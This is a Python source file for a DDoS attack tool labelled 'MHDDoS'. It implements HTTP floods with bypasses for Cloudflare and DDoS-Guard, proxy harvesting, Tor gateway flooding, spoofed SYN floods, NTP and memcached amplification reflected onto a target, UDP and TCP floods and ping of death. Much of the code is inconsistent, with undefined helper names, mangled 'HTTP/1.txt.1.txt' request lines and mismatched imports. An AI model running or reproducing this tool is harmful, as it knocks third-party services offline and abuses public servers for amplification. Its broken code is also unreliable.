
import json
import socket
import sys
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
tor2webs = [
    'onion.city',
    'onion.cab',
    'onion.direct',
    'onion.sh',
    'onion.link',
    'onion.ws',
    'onion.pet',
    'onion.rip',
    'onion.plus',
    'onion.top',
    'onion.si',
    'onion.ly',
    'onion.my',
    'onion.sh',
    'onion.lu',
    'onion.casa',
    'onion.com.de',
    'onion.foundation',
    'onion.rodeo',
    'onion.lat',
    'tor2web.org',
    'tor2web.fi',
    'tor2web.blutmagie.de',
    'tor2web.to',
    'tor2web.io',
    'tor2web.in',
    'tor2web.it',
    'tor2web.xyz',
    'tor2web.su',
    'darknet.to',
    's1.tor-gateways.de',
    's2.tor-gateways.de',
    's3.tor-gateways.de',
    's4.tor-gateways.de',
    's5.tor-gateways.de'
]

with open(__dir__ / "config.json") as f:
    con = json.load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
                                "TS3", "MCPE", "ICMP"
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) ",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile('"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool=False, precision: int=2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int=2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 318 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        try:
            with Session() as session:
                response = session.get(provider["url"], timeout=provider["timeout"])
                response.raise_for_status()
                return ProxyUtiles.parseAllIPPort(response.text.splitlines(), proxy_type)
        except Exception as e:
            logger.error(f"Error downloading proxies from {provider['url']}: {e}")
            return set()


class ProxyChecker:
    @staticmethod
    def checkAll(proxies: Set[Proxy], timeout: int=5, threads: int=200, url: str="http://httpbin.org/get") -> Set[Proxy]:
        available = set()
        with ThreadPoolExecutor(threads) as executor:
            future_to_check = {executor.submit(ProxyChecker.check, proxy, timeout, url): proxy for proxy in proxies}
            for future in as_completed(future_to_check):
                proxy = future_to_check[future]
                try:
                    if future.result():
                        available.add(proxy)
                except Exception as e:
                    logger.error(f"Error checking proxy {proxy}: {e}")
        return available

    @staticmethod
    def check(proxy: Proxy, timeout: int=5, url: str="http://httpbin.org/get") -> bool:
        try:
            with Session() as session:
                session.proxies.update(proxy.asRequest())
                response = session.get(url, timeout=timeout)
                return response.status_code == 200
        except:
            return False


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
        proxies = None

    return proxies


def start_attack(method, threads, event, socks_type, proxies=None):
    global out_file
    # layer7
    cmethod = str(method.upper())
    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        out_file = str("files/proxys/" + sys.argv[5])
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],
                                                                                   len(proxies), str(nums)))
    else:
        print("{} Attack Started To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
            for _ in range(threads):
                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
        elif method == "brust":
            for _ in range(threads):
                threading.Thread(target=brust, args=(event, socks_type), daemon=True).start()
        elif method == "get":
            for _ in range(threads):
                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
        elif method == "pps":
            for _ in range(threads):
                threading.Thread(target=pps, args=(event, socks_type), daemon=True).start()
        elif method == "even":
            for _ in range(threads):
                threading.Thread(target=even, args=(event, socks_type), daemon=True).start()
        elif method == "ovh":
            for _ in range(threads):
                threading.Thread(target=ovh, args=(event, socks_type), daemon=True).start()
        elif method == "capb":
            for _ in range(threads):
                threading.Thread(target=capb, args=(event, socks_type), daemon=True).start()
        elif method == "cookie":
            for _ in range(threads):
                threading.Thread(target=cookie, args=(event, socks_type), daemon=True).start()
        elif method == "tor":
            for _ in range(threads):
                threading.Thread(target=tor, args=(event, socks_type), daemon=True).start()
        elif method == "bypass":
            for _ in range(threads):
                threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
        elif method == "head":
            for _ in range(threads):
                threading.Thread(target=head, args=(event, socks_type), daemon=True).start()
        elif method == "stress":
            for _ in range(threads):
                threading.Thread(target=stress, args=(event, socks_type), daemon=True).start()
        elif method == "ostress":
            for _ in range(threads):
                threading.Thread(target=ostress, args=(event, socks_type), daemon=True).start()
        elif method == "null":
            for _ in range(threads):
                threading.Thread(target=null, args=(event, socks_type), daemon=True).start()
        elif method == "cfb":
            for _ in range(threads):
                threading.Thread(target=cfb, args=(event, socks_type), daemon=True).start()
        elif method == "avb":
            for _ in range(threads):
                threading.Thread(target=AVB, args=(event, socks_type), daemon=True).start()
        elif method == "gsb":
            for _ in range(threads):
                threading.Thread(target=gsb, args=(event, socks_type), daemon=True).start()
        elif method == "dgb":
            for _ in range(threads):
                threading.Thread(target=dgb, args=(event, socks_type), daemon=True).start()
        elif method == "dyn":
            for _ in range(threads):
                threading.Thread(target=dyn, args=(event, socks_type), daemon=True).start()
        elif method == "hit":
            for _ in range(threads):
                threading.Thread(target=hit, args=(event, timer), daemon=True).start()

        # layer4

        elif method == "vse":
            for _ in range(threads):
                threading.Thread(target=vse, args=(event, timer), daemon=True).start()
        elif method == "udp":
            for _ in range(threads):
                threading.Thread(target=udp, args=(event, timer), daemon=True).start()
        elif method == "tcp":
            for _ in range(threads):
                threading.Thread(target=tcp, args=(event, timer), daemon=True).start()
        elif method == "syn":
            for _ in range(threads):
                threading.Thread(target=syn, args=(event, timer), daemon=True).start()
        elif method == "mem":
            for _ in range(threads):
                threading.Thread(target=mem, args=(event, timer), daemon=True).start()
        elif method == "ntp":
            for _ in range(threads):
                threading.Thread(target=ntp, args=(event, timer), daemon=True).start()

        # layer3
        elif method == "icmp":
            for _ in range(threads):
                threading.Thread(target=icmp, args=(event, timer), daemon=True).start()
        elif method == "pod":
            for _ in range(threads):
                threading.Thread(target=pod, args=(event, timer), daemon=True).start()
    except:
        pass


def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))


def Headers(method):
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "cookie":
        connection = "Connection: Keep-Alive\r\n"
        more = "Cache-Control: max-age=0\r\n"
        more2 = "Via: 1.0.0.0 PROXY\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
    elif method == "brust":
        connection = "Connection: Keep-Alive\r\n"
        more = "Cache-Control: max-age=0\r\n"
        more2 = "Via: 1.0.0.0 PROXY\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        accept = "Accept: */*\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
    elif method == "even":
        up = "Upgrade-Insecure-Requests: 1.txt\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        header = referer + useragent + up + xfor + "\r\n\r\n"
    elif method == "ovh":
        accept = Choice(acceptall) + "\r\n"
        more = "Connection: keep-alive\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        up = "Upgrade-Insecure-Requests: 1.txt\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = useragent + more + accept + up + "\r\n\r\n"
    elif method == "pps":
        header = "GET / HTTP/1.txt.1.txt\r\n\r\n"
    elif method == "dyn":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "socket":
        header = ""
    elif method == "null":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + referer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    elif method == "hit":
        post_host = "POST " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + referer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)


def udp(event, timer):
    event.wait()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timer:
        try:
            try:
                data = random._urandom(int(Intn(1024, 60000)))
                for _ in range(multiple):
                    s.sendto(data, (str(target), int(port)))
            except:
                s.close()
        except:
            s.close()


def icmp(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            for _ in range(multiple):
                packet = random._urandom(int(Intn(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
        except:
            pass


ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4


def ntp(event, timer):
    packets = Intn(10, 150)
    server = Choice(ntpsv)
    event.wait()
    while time.time() < timer:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=Intn(1, 65535), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(multiple):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass


mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def mem(event, timer):
    event.wait()
    packets = Intn(1024, 60000)
    server = Choice(memsv)
    while time.time() < timer:
        try:
            try:
                packet = (
                        IP(dst=server, src=target)
                        / UDP(sport=port, dport=11211)
                        / Raw(load=mem_payload)
                )
                for _ in range(multiple):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass


def tcp(event, timer):
    event.wait()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while time.time() < timer:
        try:
            data = random._urandom(int(Intn(1024, 60000)))
            address = (str(target), int(port))
            try:
                s.connect(address)
                for _ in range(multiple):
                    s.send(data)
            except:
                s.close()
        except:
            s.close()


def vse(event, timer):
    event.wait()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while time.time() < timer:
        try:
            address = (str(target), int(port))
            try:
                s.connect(address)
                for _ in range(multiple):
                    s.send(data)
            except:
                s.close()
        except:
            s.close()


class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.dominio = ''
        self.DnsType = ''

        HDNS = data[-4:-2].encode("hex")
        if HDNS == "0001":
            self.DnsType = 'A'
        elif HDNS == "000f":
            self.DnsType = 'MX'
        elif HDNS == "0002":
            self.DnsType = 'NS'
        elif HDNS == "0010":
            self.DnsType = "TXT"
        else:
            self.DnsType = "Unknown"

        tipo = (ord(data[2]) >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = ord(data[ini])
            while lon != 0:
                self.dominio += data[ini + 1:ini + lon + 1] + '.'
                ini += lon + 1
                lon = ord(data[ini])

    def respuesta(self, ip):
        packet = ''
        if self.dominio:
            packet += self.data[:2] + "\x81\x80"
            packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += '\xc0\x0c'  # Pointer to domain name
            packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'  # Response type, ttl and resource data length -> 4 bytes
            packet += str.join('', map(lambda x: chr(int(x)), ip.split('.')))  # 4bytes of IP
        return packet


def dns(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind(('', 53))
            data, addr = s.recvfrom(1024)
            p = DNSQuery(data)
            for _ in range(multiple):
                s.sendto(p.respuesta(target), addr)
        except:
            s.close()


def syn(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            IP_Packet = IP()
            IP_Packet.src = randomIP()
            IP_Packet.dst = target

            TCP_Packet = TCP()
            TCP_Packet.sport = randint(1, 65535)
            TCP_Packet.dport = int(port)
            TCP_Packet.flags = "S"
            TCP_Packet.seq = randint(1000, 9000)
            TCP_Packet.window = randint(1000, 9000)
            for _ in range(multiple):
                send(IP_Packet / TCP_Packet, verbose=0)
        except:
            pass


def pod(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass


def stop():
    print('All Attacks Stopped !')
    os.system('pkill python*')
    exit()


def dyn(event, socks_type):
    header = Headers("dyn")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + random_data() + "." + target + "\r\n"

    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def http(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def capb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def ovh(event, socks_type):
    header = Headers("ovh")
    proxy = Choice(proxies).strip().split(":")
    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def pps(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    request = Headers("pps")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
